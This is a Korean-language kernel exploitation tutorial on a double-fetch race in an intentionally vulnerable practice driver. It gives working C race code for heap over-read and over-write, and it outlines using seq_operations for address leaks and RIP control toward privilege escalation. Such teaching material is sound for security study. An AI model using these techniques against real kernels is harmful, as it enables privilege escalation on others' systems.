---
title: Double Fetch
tags:
    - [Linux]
    - [Kernel]
    - [Data Race]
    - [Double Fetch]
    - [seq_operations]
    - [Stack Pivot]
lang: kr
permalink: /kr/linux-kernel/LK03/double_fetch.html
pagination: true
bk: ../LK02/null_ptr_deref.html
fd: ../LK04/uffd.html
---
LK03(Dexter)에서는 Double Fetch라고 불리는 취약점을 배웁니다. 먼저 [연습문제 LK03](distfiles/LK03.tar.gz) 파일을 다운로드하세요.

## QEMU 부팅 옵션
LK03에서는 SMEP, KASLR, KPTI가 활성화되어 있고 SMAP은 비활성화되어 있습니다. 또한 이번에 다루는 취약점은 경쟁 상태와 관련된 버그이므로, 멀티코어로 동작한다는 점에도 주의해야 합니다.[^1]
SMAP은 권한 상승을 더 쉽게 하기 위해서만 꺼 둔 것이고, 취약점 자체는 SMAP이 켜져 있어도 발화합니다.
```sh
#!/bin/sh
qemu-system-x86_64 \
    -m 64M \
    -nographic \
    -kernel bzImage \
    -append "console=ttyS0 loglevel=3 oops=panic panic=-1 pti=on kaslr" \
    -no-reboot \
    -cpu kvm64,+smep \
    -smp 2 \
    -monitor /dev/null \
    -initrd rootfs.cpio \
    -net nic,model=virtio \
    -net user
```

## 소스 코드 분석
먼저 LK03의 소스 코드를 읽어 봅시다. 소스 코드는 `src/dexter.c`에 있습니다.
이 프로그램은 최대 0x20바이트의 데이터를 저장할 수 있는 커널 모듈입니다. `ioctl`로 조작할 수 있고, 데이터를 읽는 기능과 쓰는 기능을 제공합니다.
```c
#define CMD_GET 0xdec50001
#define CMD_SET 0xdec50002
...
  switch (cmd) {
    case CMD_GET: return copy_data_to_user(filp, (void*)arg);
    case CMD_SET: return copy_data_from_user(filp, (void*)arg);
    default: return -EINVAL;
  }
```
디바이스가 `open`되면 `private_data`에 0x20바이트 영역이 `kzalloc`으로 할당됩니다. 이 영역은 디바이스를 `close`하면 해제됩니다.
```c
static int module_open(struct inode *inode, struct file *filp) {
  filp->private_data = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!filp->private_data) return -ENOMEM;
  return 0;
}

static int module_close(struct inode *inode, struct file *filp) {
  kfree(filp->private_data);
  return 0;
}
```
`ioctl`이 호출되면, 먼저 `verify_request`에서 사용자로부터 전달된 데이터를 검사합니다. 여기서는 사용자로부터 받은 데이터 포인터가 NULL이 아니고, 크기가 0x20을 넘지 않는지 확인합니다.
```c
int verify_request(void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -1;
  if (!req.ptr || req.len > BUFFER_SIZE)
    return -1;
  return 0;
}

...

  if (verify_request((void*)arg))
    return -EINVAL;
```
그다음 `CMD_GET`, `CMD_SET`에서는 각각 `private_data`에서 사용자에게 데이터를 복사하거나, 사용자로부터 `private_data`로 데이터를 복사할 수 있습니다.
```c
long copy_data_to_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_to_user(req.ptr, filp->private_data, req.len))
    return -EINVAL;
  return 0;
}

long copy_data_from_user(struct file *filp, void *reqp) {
  request_t req;
  if (copy_from_user(&req, reqp, sizeof(request_t)))
    return -EINVAL;
  if (copy_from_user(filp->private_data, req.ptr, req.len))
    return -EINVAL;
  return 0;
}
```
사용자로부터 데이터를 복사하기 전에 `verify_request`에서 크기를 검사하고 있으므로, 얼핏 보면 Heap Buffer Overflow는 존재하지 않는 것처럼 보입니다.

## Double Fetch
**Double Fetch**는 커널 공간에서 발생하는 데이터 경쟁의 한 종류에 붙은 이름입니다. 이름 그대로 커널이 같은 데이터를 두 번 fetch, 즉 읽어 오는 과정에서 발생하는 경쟁 상태를 의미합니다.
아래 그림처럼 커널 공간이 사용자 공간의 같은 데이터를 두 번 읽을 때, 그 사이에 다른 스레드가 그 데이터를 변경할 수 있습니다.

<center>
  <img src="img/double_fetch.png" alt="Double Fetch" style="width:720px;">
</center>

그러면 첫 번째 fetch와 두 번째 fetch에서 관측한 데이터가 달라져 정합성이 깨집니다. 이런 데이터 경쟁을 Double Fetch라고 부릅니다. [LK01에서 다룬 경쟁](../LK01/race_condition.html)과 크게 다른 점은, 이 버그는 커널 쪽에서 mutex를 잡는 것만으로는 해결할 수 없다는 점입니다.

이번 드라이버에서는 `verify_request`와 `copy_data_to_user`/`copy_data_from_user`에서 사용자 요청 데이터를 fetch합니다. 즉 `verify_request`에서는 정상적인 크기를 전달하고, 그 뒤 `copy_data_to_user` 혹은 `copy_data_from_user`가 실행되기 전 사이에 크기를 비정상적인 값으로 바꿔 버리면 Heap Buffer Overflow를 일으킬 수 있습니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_suyasuya.png" alt="늑대" ></div>
  <p class="says">
    사용자 공간 데이터를 여러 번 다뤄야 할 때는, 처음에 커널 공간으로 복사한 뒤 그 복사본만 써야 하는 거네.
  </p>
</div>

## 취약점 발화
먼저 정상적인 사용법부터 확인해 봅시다. 다음과 같이 드라이버에 데이터를 저장할 수 있습니다.
```c
int set(char *buf, size_t len) {
  request_t req = { .ptr=buf, .len=len };
  return ioctl(fd, CMD_SET, &req);
}
int get(char *buf, size_t len) {
  request_t req = { .ptr=buf, .len=len };
  return ioctl(fd, CMD_GET, &req);
}

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  char buf[0x20];
  set("Hello, World!", 13);
  get(buf, 13);
  printf("%s\n", buf);

  close(fd);
  return 0;
}
```

다음으로 Double Fetch의 동작을 확인해 봅시다. 우선 적당한 코드를 작성해서 취약점이 실제로 발화하는지 확인합니다. 여기서는 저장한 적 없는 데이터가 읽힐 때까지 경쟁을 반복하는 코드를 작성했습니다.
```c
int fd;
request_t req;

int set(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_SET, &req);
}
int get(char *buf, size_t len) {
  req.ptr = buf;
  req.len = len;
  return ioctl(fd, CMD_GET, &req);
}

int race_win = 0;

void *race(void *arg) {
  while (!race_win) {
    req.len = 0x100;
    usleep(1);
  }
  return NULL;
}

int main() {
  fd = open("/dev/dexter", O_RDWR);
  if (fd == -1) fatal("/dev/dexter");

  char buf[0x100] = {}, zero[0x100] = {};
  pthread_t th;
  pthread_create(&th, NULL, race, NULL);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, 0x100) != 0) {
      race_win = 1;
      break;
    }
  }
  pthread_join(th, NULL);

  for (int i = 0; i < 0x100; i += 8) {
    printf("%02x: 0x%016lx\n", i, *(unsigned long*)&buf[i]);
  }

  close(fd);
  return 0;
}
```
메인 스레드는 올바른 크기로 `CMD_GET`을 호출하고, 서브 스레드는 사용자 공간에 있는 크기 정보를 비정상적인 값으로 덮어씁니다. `verify_request`가 호출된 뒤 `copy_data_to_user`가 호출되기 전 사이에 서브 스레드가 크기 정보를 바꿔 버리면, 잘못된 크기로 데이터가 복사되어 Heap Buffer Overflow가 발생합니다.

`CMD_GET`의 경우 실제로 버퍼 크기를 넘어 데이터를 읽었는지만 확인하면 되지만, `CMD_SET`에서 버퍼 오버플로가 성공했는지는 어떻게 확인해야 할까요? 방법은 여러 가지가 있겠지만, 여기서는 고정 횟수만큼 범위 밖 쓰기를 시도한 뒤, 끝나고 나서 범위 밖 읽기로 성공 여부를 확인하는 방식을 택했습니다.
```c
void overread(char *buf, size_t len) {
  char *zero = (char*)malloc(len);
  pthread_t th;
  pthread_create(&th, NULL, race, (void*)len);

  memset(buf, 0, len);
  memset(zero, 0, len);
  while (!race_win) {
    get(buf, 0x20);
    if (memcmp(buf, zero, len) != 0) {
      race_win = 1;
      break;
    }
  }

  pthread_join(th, NULL);
  race_win = 0;
  free(zero);
}

void overwrite(char *buf, size_t len) {
  pthread_t th;
  char *tmp = (char*)malloc(len);

  while (1) {
    // 정해진 횟수만큼 race 시도
    pthread_create(&th, NULL, race, (void*)len);
    for (int i = 0; i < 0x10000; i++) set(buf, 0x20);
    race_win = 1;
    pthread_join(th, NULL);
    race_win = 0;
    // 힙 오버플로가 성공하지 않았으면 재시도
    overread(tmp, len);
    if (memcmp(tmp, buf, len) == 0) break;
  }

  free(tmp);
}
```
이렇게 힙 오버플로를 시도했더니, 저자의 환경에서는 우연히 뒤쪽에 망가뜨리면 안 되는 데이터가 있었던 것 같고, 아래처럼 커널 패닉이 발생했습니다.

<center>
  <img src="img/dexter_crash.png" alt="힙 오버플로에 의한 크래시" style="width:720px;">
</center>

## `seq_operations`
이번에 파괴할 수 있는 영역은 `kmalloc-32`이므로, 같은 크기대에서 공격에 쓸 수 있는 객체를 찾아야 합니다. `kmalloc-32`에서는 [`seq_operations` 구조체](https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/seq_file.h#L32)가 유용합니다.
```c
struct seq_operations {
    void * (*start) (struct seq_file *m, loff_t *pos);
    void (*stop) (struct seq_file *m, void *v);
    void * (*next) (struct seq_file *m, void *v, loff_t *pos);
    int (*show) (struct seq_file *m, void *v);
};
```
`seq_operations`는 sysfs, debugfs, procfs 등의 특수 파일을 사용자 공간에서 읽을 때 커널 쪽에서 호출되는 핸들러를 담고 있는 구조체입니다. 따라서 `/proc/self/stat` 같은 특수 파일을 열면 확보할 수 있습니다.
함수 포인터를 포함하고 있으므로 커널 주소 누출에 쓸 수 있고, 예를 들어 `read`를 호출하면 `seq_operations`의 `start`가 불리기 때문에 RIP 제어도 가능합니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
  <p class="says">
    kmalloc-32에서 쓰이는 구조체는 이것 말고도 많이 있어.<br>
    자세한 건 예제에서 직접 찾아 보자.
  </p>
</div>

## 권한 상승
이번에는 SMAP이 비활성화되어 있으므로 사용자 공간으로 Stack Pivot이 가능합니다. 각자 ROP chain을 작성해서 권한 상승을 시도해 보세요.

<center>
  <img src="img/dexter_privesc.png" alt="Double Fetch를 통한 권한 상승" style="width:320px;">
</center>

[^1]: 싱글코어에서도 경쟁을 일으키는 방법은 뒤 장에서 다시 나옵니다.

---

<div class="column" title="예제">
  SMAP을 활성화해도 동작하도록 exploit을 수정해 보세요.
</div>
